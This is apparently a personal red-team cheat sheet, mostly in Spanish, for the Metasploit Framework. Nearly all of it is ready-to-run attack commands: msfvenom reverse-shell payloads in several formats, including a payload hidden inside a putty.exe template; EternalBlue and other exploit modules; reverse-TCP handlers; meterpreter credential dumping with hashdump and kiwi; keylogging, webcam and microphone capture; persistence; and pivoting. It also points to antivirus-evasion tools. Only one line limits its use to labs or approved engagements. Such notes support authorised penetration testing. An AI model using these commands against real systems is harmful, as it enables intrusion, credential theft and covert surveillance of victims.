---
aliases:
  - Metasploit
  - MSF
  - msfconsole
tags:
  - type/tool
  - tool/metasploit
  - technique/exploitation
  - technique/post-exploitation
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Exploitation Tools]]"
linked:
  - "[[Common Exploitation Tools]]"
  - "[[nmap]]"
  - "[[Windows Privilege Escalation]]"
  - "[[Linux Privilege Escalation]]"
  - "[[Active Directory Explotación]]"
  - "[[Pass-the-Hash]]"
  - "[[NTLM Relay]]"
---
# Metasploit Framework

***

## Overview

Framework de exploits + post-exploitation. Componentes: **msfconsole** (CLI principal), **msfvenom** (generador de payloads), **msfdb** (PostgreSQL backend para hosts/services/creds), **meterpreter** (payload extensible con agente en memoria).

Install: `apt install metasploit-framework` / `curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb | bash`.

> Regla: Metasploit deja IOCs ruidosos. Usar en CTFs / labs / engagements con luz verde. Para stealth → manual o C2 custom.

***

## Setup DB

```bash
sudo systemctl start postgresql
sudo msfdb init                 # crea workspace + user
msfconsole
msf6 > db_status                # debería decir connected
msf6 > workspace -a client_X    # workspace por engagement
msf6 > workspace client_X
```

### Import de nmap

```bash
msf6 > db_nmap -sC -sV -p- target.com
msf6 > services                 # auto-populado
msf6 > hosts
msf6 > vulns
```

O desde fuera:

```bash
nmap -sC -sV -oX scan.xml target && msfconsole -qx "db_import scan.xml; exit"
```

***

## Módulos

Tipos: `exploit/`, `auxiliary/` (scanners, fuzzers, DoS), `post/` (post-exploitation), `payload/`, `encoder/`, `nop/`, `evasion/`.

### Búsqueda

```bash
msf6 > search ms17-010
msf6 > search type:exploit platform:windows rank:excellent
msf6 > search cve:2021-4034
msf6 > search eternalblue
msf6 > info exploit/windows/smb/ms17_010_eternalblue
```

Refinar con filtros: `name:`, `path:`, `author:`, `platform:`, `type:`, `cve:`, `edb:`, `rank:`, `disclosure_date:`.

### Uso típico

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 (eternalblue) > show options
msf6 (eternalblue) > set RHOSTS 10.10.10.10
msf6 (eternalblue) > set LHOST tun0          # autodetect tun0
msf6 (eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 (eternalblue) > check                    # valida sin explotar
msf6 (eternalblue) > run                      # o exploit
msf6 (eternalblue) > back
```

### Variables globales

```bash
msf6 > setg LHOST tun0
msf6 > setg LPORT 4444
msf6 > setg RHOSTS 10.10.10.0/24
msf6 > save                    # persiste en ~/.msf4/config
```

***

## Payloads

### Staged vs stageless

- **Staged**: `windows/meterpreter/reverse_tcp` — pequeño stager descarga stage2. Más sigiloso a primera vista, más tráfico.
- **Stageless**: `windows/meterpreter_reverse_tcp` (sin `/`) — todo en un blob. Más grande, un solo hit.

### Matriz común

| Plataforma | Payload | Nota |
|---|---|---|
| Windows x64 | `windows/x64/meterpreter/reverse_tcp` | default |
| Windows x64 HTTPS | `windows/x64/meterpreter/reverse_https` | TLS, cert válido recomendado |
| Windows x64 smb | `windows/x64/meterpreter/bind_named_pipe` | pivote sin tráfico saliente |
| Windows shell | `windows/x64/shell_reverse_tcp` | cmd.exe — ligero |
| Linux x64 | `linux/x64/meterpreter/reverse_tcp` | |
| Linux x64 shell | `linux/x64/shell_reverse_tcp` | |
| macOS | `osx/x64/meterpreter/reverse_tcp` | |
| PHP | `php/meterpreter/reverse_tcp` | web shell upload |
| Java | `java/meterpreter/reverse_tcp` | cross-platform |
| Python | `python/meterpreter/reverse_tcp` | si hay python en host |

***

## msfvenom

Generar payloads standalone.

```bash
# Windows exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o rev.exe

# Windows DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f dll -o rev.dll

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o rev.elf

# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f raw -o rev.php
# prepend <?php para que ejecute si no lo pone

# ASPX
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f aspx -o rev.aspx

# JSP (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4444 -f raw -o rev.jsp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4444 -f war -o rev.war

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f raw -o rev.py

# Shellcode para C/embebido
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f c

# Bind
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f exe -o bind.exe

# Listar payloads
msfvenom -l payloads | grep meterpreter | grep windows
```

### Encoders / evasion

```bash
# NO es AV bypass moderno. Útil solo si hay bad chars.
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o enc.exe

# Template exe (más plausible)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -x /usr/share/windows-binaries/putty.exe -k -f exe -o putty_rev.exe
```

Para evadir AVs modernos → obfuscación custom, C# loaders, ScareCrow, Donut.

***

## Handler / multi-handler

```bash
msf6 > use exploit/multi/handler
msf6 (handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 (handler) > set LHOST tun0
msf6 (handler) > set LPORT 4444
msf6 (handler) > set ExitOnSession false    # no morir si sesión cae
msf6 (handler) > exploit -j                 # background, reutilizable
```

Resource script para handler recurrente:

```bash
cat > /tmp/handler.rc <<EOF
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
set ExitOnSession false
exploit -j
EOF
msfconsole -r /tmp/handler.rc
```

***

## Sessions

```bash
msf6 > sessions                    # listar
msf6 > sessions -i 1               # interactuar
msf6 > sessions -u 1               # upgrade shell → meterpreter
msf6 > sessions -C "sysinfo" -i 1  # correr comando
msf6 > sessions -k 1               # matar
msf6 > background   # (dentro de sesión) volver a msf
```

### Shell → Meterpreter

```bash
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 > set SESSION 1
msf6 > run
```

***

## Meterpreter

### Comandos core

```bash
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid
meterpreter > ps
meterpreter > migrate <pid>           # migrar a proceso estable
meterpreter > background
meterpreter > exit
```

### FS

```bash
meterpreter > pwd / lpwd
meterpreter > cd / lcd
meterpreter > ls
meterpreter > cat file
meterpreter > upload /local remote
meterpreter > download remote /local
meterpreter > search -f *.kdbx -d C:\\
meterpreter > edit file
meterpreter > rm file
```

### Sistema

```bash
meterpreter > shell
meterpreter > execute -f cmd.exe -i -H
meterpreter > getprivs
meterpreter > getsystem            # 4 técnicas local privesc (named pipe, token dup)
meterpreter > hashdump             # SAM (solo si SYSTEM)
meterpreter > run post/windows/gather/hashdump
```

### Privesc modules

```bash
meterpreter > run post/multi/recon/local_exploit_suggester
meterpreter > use exploit/windows/local/bypassuac_*       # varias variantes
meterpreter > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
meterpreter > use exploit/windows/local/cve_2021_1732_win32k
```

### Credenciales

```bash
meterpreter > load kiwi            # mimikatz embebido
meterpreter > creds_all
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
meterpreter > kerberos_ticket_list
meterpreter > golden_ticket_create ...
```

Ver [[Mimikatz Cheatsheet]] para comandos equivalentes.

### Networking / pivote

```bash
meterpreter > ipconfig
meterpreter > arp
meterpreter > netstat
meterpreter > route                          # rutas host
meterpreter > run autoroute -s 10.10.20.0/24 # ruta via meterpreter
# O desde msf:
msf6 > route add 10.10.20.0/24 1
msf6 > use auxiliary/server/socks_proxy       # SOCKS5 para proxychains
msf6 > set VERSION 5
msf6 > run -j
```

Luego: `proxychains nxc smb 10.10.20.0/24 ...`.

### Port forward

```bash
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.20.10
meterpreter > portfwd list
meterpreter > portfwd flush
```

### Keylogger / webcam / mic

```bash
meterpreter > keyscan_start / keyscan_dump / keyscan_stop
meterpreter > screenshot
meterpreter > webcam_list / webcam_snap / webcam_stream
meterpreter > record_mic -d 10
```

### Persistencia (post modules)

```bash
meterpreter > run post/windows/manage/persistence_exe
meterpreter > use exploit/windows/local/persistence
# También: registry run keys, scheduled tasks, services
```

***

## Módulos de referencia útiles

### Scanners (auxiliary)

```bash
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_login          # brute/spray SMB
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/http/tomcat_mgr_login
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/winrm/winrm_login
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/snmp/snmp_enum
```

### AD / Kerberos

```bash
use auxiliary/gather/kerberos_enumusers       # user enum via AS
use auxiliary/gather/ldap_query
use exploit/windows/smb/psexec                # PtH compatible
use exploit/windows/smb/psexec_psh            # PowerShell variant
use auxiliary/admin/kerberos/get_ticket       # ticket ops
use auxiliary/scanner/smb/impacket/petitpotam
```

### Web exploits comunes

```bash
use exploit/multi/http/log4shell_header_injection     # Log4j
use exploit/multi/http/struts2_content_type_ognl      # S2-045
use exploit/unix/webapp/drupal_drupalgeddon2          # Drupal
use exploit/linux/http/spring4shell                   # CVE-2022-22965
use exploit/multi/http/tomcat_mgr_upload              # war upload
use exploit/multi/http/jenkins_script_console
```

### Windows exploits emblemáticos

```bash
use exploit/windows/smb/ms17_010_eternalblue          # EternalBlue
use exploit/windows/smb/ms08_067_netapi                # legacy
use auxiliary/admin/smb/ms17_010_command               # MS17-010 sin shell
use exploit/windows/dcerpc/cve_2022_26923_certifried
use exploit/windows/http/exchange_proxylogon_rce       # ProxyLogon
use exploit/windows/smb/zerologon_nltmrelayx           # CVE-2020-1472
```

***

## Resource scripts (.rc)

Automatizar flujos:

```bash
# run.rc
workspace -a client
db_nmap -sC -sV target.com
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
set LHOST tun0
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit -z
```

```bash
msfconsole -qr run.rc
```

***

## Logging

- `~/.msf4/logs/` — logs de sesiones, console output.
- `spool /tmp/msf.log` → duplicar output a file.
- `loot` → creds, archivos, hashes descargados.

***

## Tips

- `-j` (background) en exploits → sesiones paralelas, no bloquea msfconsole.
- `-z` → no interactuar con sesión al crearse.
- `sessions -u 1` desde shell normal → meterpreter upgrade.
- `check` en exploits antes de `run` para evitar crashear servicios.
- Staged payloads sobre NAT: `ReverseListenerBindAddress` + port-fwd.
- `AutoRunScript` en handler: ejecuta algo auto al obtener sesión (`multi_console_command`, `migrate -f`).

***

## Referencias

- Docs: https://docs.metasploit.com/
- Exploit DB → MSF: modules en `/usr/share/metasploit-framework/modules/`
- Cheatsheets: `help <cmd>` dentro de msfconsole
